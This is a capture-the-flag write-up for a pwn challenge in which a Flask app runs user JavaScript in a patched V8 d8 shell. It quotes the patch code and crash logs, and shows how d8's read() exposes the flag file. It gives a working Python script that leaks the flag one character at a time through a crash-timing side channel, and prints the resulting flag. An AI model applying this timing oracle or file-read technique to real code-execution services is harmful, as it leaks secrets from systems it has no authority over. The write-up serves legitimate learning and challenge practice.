# buzzword-browserpwn

[library.m0unt41n.ch/challenges/buzzword-browserpwn](https://library.m0unt41n.ch/challenges/buzzword-browserpwn) ![](../../resources/pwn.svg) ![](../../resources/hard.svg) 

# TL;DR

A Flask app that allows running custom code with an embedded `d8` binary.
The code can read the flag via d8's `read()` function, which enables a
timing-based attack.

# The app

A _really_ very simple app:

*   `GET /` renders a simple `index.html`, with a `POST /run` form,
    that takes `js_input` as a textarea.
*   `POST /run` takes that input, creates `/tmp/run.js`, starts
    `/home/v8/d8 --no-memory-protection-keys /tmp/run.js` and
    renders fully static `run.html`.

So, we can get the `d8` to run an arbitrary piece of JS - but with no
way to get the result back.

# d8 runner

`d8` is the debug console of `v8` runtime. With some Google searching:

*   [v8.dev/docs/d8](https://v8.dev/docs/d8)
*   [Useful built-in functions and objects in d8](https://riptutorial.com/v8/example/25393/useful-built-in-functions-and-objects-in-d8)
*   [Volatility plugin](https://github.com/BiTLab-BaggiliTruthLab/V8-Memory-Forensics-Plugins/blob/main/plugins/V8MapScan.py)
    for analyzing V8 heap dumps (likely: the included `snapshot_blob_bin`).
*   [Somewhat related vulnerability analysis](https://ssd-disclosure.com/turborand-v8-type-confusion-private-property-leak/)

## `vuln.patch`

There is a patch file, whose main functionality seems to be adding
`GetMap()` and `SetMap()` methods to the `Array` object.

```c
BUILTIN(ArrayGetMap) {
  Handle<JSReceiver> receiver;
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    isolate, receiver, Object::ToObject(isolate, args.receiver()));

  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
  return array->map();
}

BUILTIN(ArraySetMap) {
  Handle<JSReceiver> receiver;
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
    isolate, receiver, Object::ToObject(isolate, args.receiver()));

  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
  Handle<Map> newMap = args.at<Map>(1);
  JSObject::MigrateToMap(isolate, array, newMap);
  return ReadOnlyRoots(isolate).undefined_value();
}
```

This can be ***sort of*** confirmed by running `d8`:

*   `GetMap()`:

    ```
    $ ./d8 
    V8 version 12.3.0 (candidate)
    
    d8> let a = [1, 2, 3];
    undefined

    d8> a.GetMap()
    abort: Unexpected instance type encountered
    ==== JS stack trace =========================================
        0: ExitFrame [pc: 0x5586c85b5fb6]
        1: StubFrame [pc: 0x5586c86a2992]
    (...)
     #1# 0x2c440004b455: 0x2c440004b455 <JSFunction isProxy (sfi = 0x2c440019af9d)>
    =====================
    Trace/breakpoint trap (core dumped)
    ```

*   `SetMap()`

    ```
    $ ./d8
    V8 version 12.3.0 (candidate)

    d8> let a = [1, 2, 3];
    undefined

    d8> a.SetMap(0);
    Received signal 11 SEGV_MAPERR 00000000000b
    ==== C stack trace ===============================
     [0x5603673646d3]
     [0x560367364622]
     [0x7fe3f44be090]
     [0x56036648003a]
     [0x56036605f11f]
     [0x5603671dbeb6]
    [end of stack trace]
    Segmentation fault (core dumped)
    ```

"Sort of", as this is obviously not the intended behavior &#128578; but still, this
confirms that these methods are there.

Separately, the `vuln.patch` comments out `V8_ENABLE_SANDBOX` in he build file.
So, overall, we have:

*   Two custom function for accessing runtime internals
*   Disabled sandbox
*   `--memory-protection-keys` (protect code memory with PKU if available)

# JS-only solution?

Before digging deeper into exploiting the low-level V8 vulnerability: we have
a somewhat-arbitrary JS execution. What can we do there?

*   First of all: we can read the flag, with built-in
    [read(fname)](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/d8/d8.cc;l=3793;bpv=1;bpt=1):

    ```javascript
    flag = read("/home/v8/flag");
    console.log(flag);
    ```

    That prints the flag on the Docker console.

*   [Above command list](https://riptutorial.com/v8/example/25393/useful-built-in-functions-and-objects-in-d8)
    mentions `os.system(command)`. That would be very convenient - while
    most of the files inside `/home/v8` are owned by root, we have just enough
    permissions to delete the `/home/v8/d8` and overwrite it with something custom.

    Unfortunately, `os.system` is not available in the provided d8. This is because it is
    [conditional on a flag](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/d8/d8-posix.cc;l=748-750)
    that is not set here.

*   My next idea was to overwrite the `run.html` template with a flag. We **do** have
    access to `writeFile(fname, s)`
    ([source](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/d8/d8.cc;l=3790;bpv=1;bpt=1))
    and that *does* allow copying the flag around:

    ```javascript
    flag = read("/home/v8/flag");
    writeFile("/tmp/index.html", flag);
    ```

    This creates a file in `/tmp`. But, we can't overwrite the HTML template,
    because of permission problem above.

*   Overall, there are very few places we can write to:

    ```bash
    $ find / -writable 2>/dev/null | grep -Ev '^/(proc|dev)'
    /var/lock
    /var/tmp
    /run/lock
    /home/v8
    /home/v8/.bashrc
    /home/v8/.bash_logout
    /home/v8/.profile
    /tmp
    ```

# Time-based attack

With all the direct options off the table, we still have arbitrary code execution.
That should enable time-based attack?

First problem: there is no `sleep()` in the d8 environment. But, while looking into
that, I found even more interesting one: the d8 runtime was *very* prone to crashing.
In particular, a simple, infinite `for` loop, crash-dumped, only after about a second.

Lack of `sleep()` seems to be a
[common JS question](https://www.google.com/search?q=implementing+sleep+in+javascript+with+async+await+promise).
I found some more fancy solutions (using Promises and async execution), but none of
them worked reliably. But, fortunately, my d8 crashed _just slowly enough_ that,
compared to a quick return, there was just enough difference to mount a timing attack:

```python
import requests
import time

URL = "http://localhost:1337/run"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ}{!#$%&()+,-./:;<=>@[]^`|~ "
TIME_THRESHOLD = 0.3   # 0.12 for remote

flag = ""
for pos in range(9999):
    for c in CHARSET: 
        JS = "flag=read('/home/v8/flag');\nif (flag["+str(pos)+"]=='"+c+"') while(1) { }"
        t = time.time()
        requests.post(URL, data={"js_input": JS})
        t = time.time() - t
        if t > TIME_THRESHOLD:
            break
    flag += c
    print(flag)
    if c==" " or c=='}':
        break
```

This worked locally &#128578;

Interestingly, to get the remote flag, I had to change time threshold to **lower**
value than on the local one (`0.3` -> `0.12`). That's probably because my machine
can handle v8 abuse for a bit longer than the remote container. Then, the result:

```
s
sh
shc

(...)

shc2024{chr0m3_v8_pwn3d_br0ws3r_3xpl01t4t10
shc2024{chr0m3_v8_pwn3d_br0ws3r_3xpl01t4t10n
shc2024{chr0m3_v8_pwn3d_br0ws3r_3xpl01t4t10n}
```

---

## `shc2024{chr0m3_v8_pwn3d_br0ws3r_3xpl01t4t10n}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
